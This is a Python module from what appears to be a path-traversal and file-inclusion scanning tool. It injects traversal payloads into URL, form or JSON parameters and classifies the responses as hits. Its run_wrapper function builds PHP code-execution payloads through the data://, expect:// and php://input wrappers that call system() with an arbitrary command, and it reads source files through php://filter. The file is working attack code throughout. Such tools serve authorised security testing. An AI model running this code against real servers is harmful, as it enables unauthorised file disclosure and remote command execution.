"""Network layer: inject payloads, send via a Session, classify responses."""
import time
import uuid

from .payloads import generate_payloads
from .detector import classify
from .targets import load as load_targets, DEFAULT_TARGETS  # noqa: F401 (re-export)
from .transport import (  # noqa: F401 (inject/FUZZ re-exported)
    inject, inject_body, inject_json, send, FUZZ,
)
from .wrappers import php_filter_read, data_wrapper, expect_wrapper, php_input_body


def _prepare(url_template, data_template, json_template, payload):
    """Build (url, data, json_body) for one payload, injecting into whichever
    location carries the FUZZ marker."""
    if json_template is not None:
        return url_template, None, inject_json(json_template, payload)
    if data_template is not None:
        return url_template, inject_body(data_template, payload), None
    return inject(url_template, payload), None, None


def _baseline(session, method, url_template, data_template, json_template):
    """Send a junk filename to learn the failure response for this mode."""
    url, data, json_body = _prepare(url_template, data_template, json_template,
                                    "this_file_does_not_exist_zzz")
    resp = send(session, method, url, data=data, json_body=json_body)
    return len(resp.text), resp.status_code


def _probe(session, method, target, payload, url_t, data_t, json_t,
           base_len, base_status):
    """Send one payload; return a hit dict or None."""
    url, data, json_body = _prepare(url_t, data_t, json_t, payload)
    try:
        resp = send(session, method, url, data=data, json_body=json_body)
    except Exception as e:  # network error: record, keep going
        print(f"[!] error on {payload[:40]}: {e}")
        return None
    result = classify(resp.text, resp.status_code, target["signature"],
                      base_len, base_status)
    if result["hit"]:
        return {"target": target["path"], "category": target.get("category"),
                "payload": payload, "method": method,
                "confidence": result["confidence"], "snippet": result["snippet"]}
    return None


def scan(session, url_template, depth=8, delay=0.3, stop_on_first=True,
         os_filter="both", targets=None, method=None,
         data_template=None, json_template=None, null_exts=None, threads=1):
    fuzz_in = (json_template if json_template is not None else
               data_template if data_template is not None else url_template)
    if FUZZ not in (fuzz_in or ""):
        raise ValueError("A FUZZ marker is required (in the URL, --data, or --json).")
    if method is None:
        method = "POST" if (data_template or json_template) else "GET"
    targets = targets if targets is not None else load_targets(os_filter=os_filter)
    base_len, base_status = _baseline(session, method, url_template,
                                      data_template, json_template)
    tasks = [(t, p) for t in targets
             for p in generate_payloads(t["path"], depth, os_filter, null_exts)]
    hits = []

    if threads and threads > 1:
        # Concurrent mode scans every payload (stop-on-first is not honoured).
        from concurrent.futures import ThreadPoolExecutor

        def work(task):
            t, p = task
            if delay:
                time.sleep(delay)
            return _probe(session, method, t, p, url_template,
                          data_template, json_template, base_len, base_status)

        with ThreadPoolExecutor(max_workers=threads) as ex:
            for r in ex.map(work, tasks):
                if r:
                    hits.append(r)
        return hits

    for t, p in tasks:
        r = _probe(session, method, t, p, url_template, data_template,
                   json_template, base_len, base_status)
        if r:
            hits.append(r)
            if stop_on_first and r["confidence"] == "HIGH":
                return hits
        time.sleep(delay)
    return hits


def run_wrapper(session, url_template, wrapper, resource=None, cmd=None,
                method=None, data_template=None, json_template=None):
    """Single-shot file-inclusion wrapper probe (php://filter, data://, expect://,
    php://input). Confirms via php-source disclosure or an RCE canary."""
    fuzz_in = (json_template if json_template is not None else
               data_template if data_template is not None else url_template)
    if FUZZ not in (fuzz_in or ""):
        raise ValueError("A FUZZ marker is required (in the URL, --data, or --json).")

    nonce = "TRAVERSE_" + uuid.uuid4().hex[:12]
    body = None
    if wrapper == "filter":
        payload, use_nonce = php_filter_read(resource), None
    elif wrapper == "data":
        payload = data_wrapper(f"<?php echo '{nonce}'; system('{cmd}'); ?>")
        use_nonce = nonce
    elif wrapper == "expect":
        payload, use_nonce = expect_wrapper(f"echo {nonce}; {cmd}"), nonce
    elif wrapper == "input":
        marker, body = php_input_body(f"<?php echo '{nonce}'; system('{cmd}'); ?>")
        payload, use_nonce = marker, nonce
    else:
        raise ValueError(f"unknown wrapper: {wrapper}")

    if json_template is not None:
        url, data, json_body, m = url_template, None, inject_json(json_template, payload), method or "POST"
    elif data_template is not None:
        url, data, json_body, m = url_template, inject_body(data_template, payload), None, method or "POST"
    else:
        url, data, json_body, m = inject(url_template, payload), None, None, method or "GET"
    if body is not None:  # php://input carries the PHP in the request body
        data, m = body, method or "POST"

    resp = send(session, m, url, data=data, json_body=json_body)
    result = classify(resp.text, resp.status_code, None, 0, 200, nonce=use_nonce)
    if result["hit"]:
        return [{"target": f"{wrapper}://{resource or cmd}", "category": "lfi",
                 "payload": payload, "method": m,
                 "confidence": result["confidence"], "snippet": result["snippet"]}]
    return []
